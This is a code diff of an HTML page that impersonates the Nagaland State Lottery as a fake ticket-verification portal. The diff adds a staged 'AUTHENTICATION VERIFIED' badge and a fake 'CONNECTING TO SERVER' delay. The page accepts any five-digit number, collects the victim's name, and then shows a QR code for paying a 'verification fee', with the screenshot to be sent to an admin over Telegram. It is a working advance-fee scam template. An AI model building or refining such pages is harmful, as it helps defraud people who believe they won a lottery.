@@ -14,7 +14,7 @@
         }
         body { 
             margin: 0; background: var(--bg-dark); font-family: 'Poppins', sans-serif; color: white;
-            overflow-x: hidden; height: 100vh;
+            overflow: hidden; height: 100vh;
         }
 
         .top-bar {
@@ -24,45 +24,54 @@
         }
         .logo { font-weight: 800; font-size: 16px; color: var(--gold); letter-spacing: 1px; text-transform: uppercase; }
 
+        /* Verification Badge - Slides in from Right */
+        #auth-badge {
+            position: fixed; top: 90px; right: -250px; /* Hidden off-screen initially */
+            background: var(--emerald); color: white;
+            padding: 10px 20px; border-radius: 30px 0 0 30px;
+            font-size: 12px; font-weight: bold; letter-spacing: 1px;
+            box-shadow: -5px 5px 15px rgba(0,0,0,0.3);
+            transition: transform 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 100; display: flex; align-items: center; gap: 8px;
+        }
+        #auth-badge.slide-in { transform: translateX(-250px); } /* Moves into view */
+
         .container { 
             position: relative; width: 100%; height: calc(100vh - 80px);
             display: flex; justify-content: center; align-items: flex-start; padding-top: 30px;
         }
 
-        /* Card System */
         .card {
             position: absolute; width: 90%; max-width: 400px;
             background: var(--card-glass); border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 28px; padding: 30px;
+            border-radius: 28px; padding: 35px 25px;
             box-shadow: 0 15px 35px rgba(0,0,0,0.4);
             transition: all 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55);
             box-sizing: border-box;
         }
 
-        /* Verified Badge (Top Left Corner) */
+        /* Ticket Badge (Inside Card) */
         .ticket-badge {
-            position: absolute; top: 15px; left: 15px;
+            position: absolute; top: 12px; left: 15px;
             background: rgba(46, 125, 50, 0.2); border: 1px solid #4ade80;
-            color: #4ade80; padding: 4px 12px; border-radius: 20px;
-            font-size: 10px; font-weight: 800;
+            color: #4ade80; padding: 3px 10px; border-radius: 6px;
+            font-size: 10px; font-weight: 700;
         }
 
-        /* Slide Animations */
         .hidden-left { transform: translateX(-150%) scale(0.8); opacity: 0; pointer-events: none; }
         .hidden-right { transform: translateX(150%) scale(0.8); opacity: 0; pointer-events: none; }
         .active-view { transform: translateX(0) scale(1); opacity: 1; pointer-events: all; }
 
-        .input-group { margin: 20px 0; }
-        label { font-size: 10px; color: #94a3b8; display: block; margin-bottom: 8px; letter-spacing: 1px; text-transform: uppercase; }
+        .input-group { margin-bottom: 18px; text-align: left; }
+        label { font-size: 10px; color: #94a3b8; display: block; margin-bottom: 6px; letter-spacing: 1px; text-transform: uppercase; }
         
         .animated-input {
             width: 100%; background: rgba(255,255,255,0.03); border: 2px solid rgba(255,255,255,0.1);
-            padding: 15px; border-radius: 14px; color: white; font-size: 18px; outline: none;
-            box-sizing: border-box; text-align: center; transition: 0.3s;
+            padding: 14px; border-radius: 12px; color: white; font-size: 16px; outline: none;
+            box-sizing: border-box; transition: 0.3s;
         }
         
-        /* Glow effect for Ticket Input */
-        .glow-input { animation: borderPulse 2s infinite; font-size: 24px; letter-spacing: 5px; }
+        .glow-box { animation: borderPulse 2s infinite; font-size: 24px; letter-spacing: 6px; text-align: center; }
         
         @keyframes borderPulse {
             0% { border-color: rgba(255, 179, 0, 0.2); box-shadow: 0 0 5px rgba(255, 179, 0, 0.1); }
@@ -72,11 +81,10 @@
 
         .btn-main {
             width: 100%; background: linear-gradient(135deg, #ffb300, #ff8f00);
-            color: #000; border: none; padding: 18px; border-radius: 16px;
+            color: #000; border: none; padding: 18px; border-radius: 15px;
             font-weight: 800; font-size: 14px; cursor: pointer; text-transform: uppercase;
         }
 
-        /* Loader */
         #loader { display: none; text-align: center; margin-top: 15px; }
         .spinner { width: 25px; height: 25px; border: 3px solid transparent; border-top: 3px solid var(--gold); border-radius: 50%; animation: spin 0.6s linear infinite; margin: 0 auto; }
         @keyframes spin { to { transform: rotate(360deg); } }
@@ -86,6 +94,11 @@
 </head>
 <body>
 
+    <div id="auth-badge">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+        AUTHENTICATION VERIFIED
+    </div>
+
     <div class="top-bar">
         <div class="logo">NAGALAND STATE LOTTERY</div>
         <div style="font-size: 10px; color: #4ade80;">● SECURE</div>
@@ -93,47 +106,46 @@
 
     <div class="container">
         <div class="card active-view" id="step1">
-            <h2 style="margin: 0; font-weight: 800;">Ticket Check</h2>
-            <p style="color: #64748b; font-size: 13px;">Official Ticket Verification Portal</p>
+            <h2 style="margin: 0 0 5px; font-weight: 800; text-align: center;">Ticket Check</h2>
+            <p style="color: #64748b; font-size: 13px; text-align: center; margin-bottom: 25px;">Official Ticket Verification Portal</p>
             
             <div class="input-group">
                 <label>Ticket Number (5 Digits)</label>
-                <input type="number" id="ticket-id" class="animated-input glow-input" placeholder="00000" oninput="if(this.value.length > 5) this.value = this.value.slice(0, 5)">
+                <input type="number" id="ticket-id" class="animated-input glow-box" placeholder="00000" oninput="if(this.value.length > 5) this.value = this.value.slice(0, 5)">
             </div>
 
             <button class="btn-main" onclick="toDetails()">Verify Now</button>
 
             <div id="loader">
                 <div class="spinner"></div>
-                <p style="font-size: 10px; color: var(--gold); margin-top: 10px;">VALIDATING RECORD...</p>
+                <p style="font-size: 10px; color: var(--gold); margin-top: 10px;">CONNECTING TO SERVER...</p>
             </div>
         </div>
 
         <div class="card hidden-right" id="step2">
-            <div class="ticket-badge" id="display-ticket">TICKET: #00000</div>
-            <h2 style="margin: 20px 0 5px; font-weight: 800; text-align: center;">Registration</h2>
-            <p style="color: #64748b; font-size: 12px; text-align: center; margin-bottom: 20px;">Enter Winner's Details</p>
+            <div class="ticket-badge" id="display-ticket">#00000</div>
+            <h2 style="margin: 15px 0 25px; font-weight: 800; text-align: center; font-size: 24px;">Registration</h2>
             
             <div class="input-group">
                 <label>First Name</label>
-                <input type="text" id="fname" class="animated-input" placeholder="Enter First Name">
+                <input type="text" id="fname" class="animated-input" placeholder="First Name">
             </div>
             <div class="input-group">
                 <label>Last Name</label>
-                <input type="text" id="lname" class="animated-input" placeholder="Enter Last Name">
+                <input type="text" id="lname" class="animated-input" placeholder="Last Name">
             </div>
 
-            <button class="btn-main" onclick="toPayment()">Confirm Details</button>
+            <button class="btn-main" onclick="toPayment()">Confirm</button>
         </div>
 
         <div class="card hidden-right" id="step3">
-            <div class="ticket-badge" id="display-ticket-final">TICKET: #00000</div>
-            <h2 style="margin: 20px 0 5px; font-weight: 800; text-align: center;">Payment</h2>
+            <div class="ticket-badge" id="display-ticket-final">#00000</div>
+            <h2 style="margin: 15px 0 10px; font-weight: 800; text-align: center;">Payment</h2>
             
-            <div style="text-align: center; margin-top: 10px;">
-                <p style="font-size: 12px; color: var(--gold); font-weight: bold; margin: 0;">OFFICIAL SCANNER</p>
-                <img src="YOUR_QR_LINK_HERE" class="qr-code" alt="Scanner">
-                <p style="font-size: 11px; color: #94a3b8;">Pay and share screenshot on Telegram</p>
+            <div style="text-align: center;">
+                <p style="font-size: 12px; color: var(--gold); font-weight: bold; margin-bottom: 10px;">OFFICIAL SCANNER</p>
+                <img src="YOUR_QR_IMAGE_URL" class="qr-code" alt="Scanner">
+                <p style="font-size: 11px; color: #94a3b8; line-height: 1.4;">Scan QR to pay verification fee<br>and send screenshot to Admin.</p>
             </div>
             
             <button class="btn-main" style="background: var(--emerald); color: white; margin-top: 20px;" onclick="finalSubmit()">Submit Payment</button>
@@ -145,32 +157,38 @@
 
         function toDetails() {
             ticketNum = document.getElementById('ticket-id').value;
-            if(ticketNum.length < 5) { alert("Invalid Ticket"); return; }
+            if(ticketNum.length < 5) { alert("Please enter a 5-digit number"); return; }
 
             document.getElementById('loader').style.display = 'block';
 
             setTimeout(() => {
+                // 1. Show the sliding badge from the red-marked area
+                document.getElementById('auth-badge').classList.add('slide-in');
+                
                 document.getElementById('display-ticket').innerText = "TICKET: #" + ticketNum;
-                // Transition
-                document.getElementById('step1').className = "card hidden-left";
-                document.getElementById('step2').className = "card active-view";
+
+                // 2. Delay the card transition slightly for better effect
+                setTimeout(() => {
+                    document.getElementById('step1').className = "card hidden-left";
+                    document.getElementById('step2').className = "card active-view";
+                }, 1000);
+                
             }, 1500);
         }
 
         function toPayment() {
             const fn = document.getElementById('fname').value;
             const ln = document.getElementById('lname').value;
-            if(!fn || !ln) { alert("Enter both names"); return; }
+            if(!fn || !ln) { alert("Please enter both names"); return; }
 
             document.getElementById('display-ticket-final').innerText = "TICKET: #" + ticketNum;
-            // Transition
             document.getElementById('step2').className = "card hidden-left";
             document.getElementById('step3').className = "card active-view";
         }
 
         function finalSubmit() {
             const fn = document.getElementById('fname').value;
-            window.location.href = "https://t.me/YOUR_USERNAME?text=Official_Claim_by_" + fn;
+            window.location.href = "https://t.me/YOUR_USERNAME?text=Official_Verification_Payment_Done_by_" + fn;
         }
     </script>
 </body>
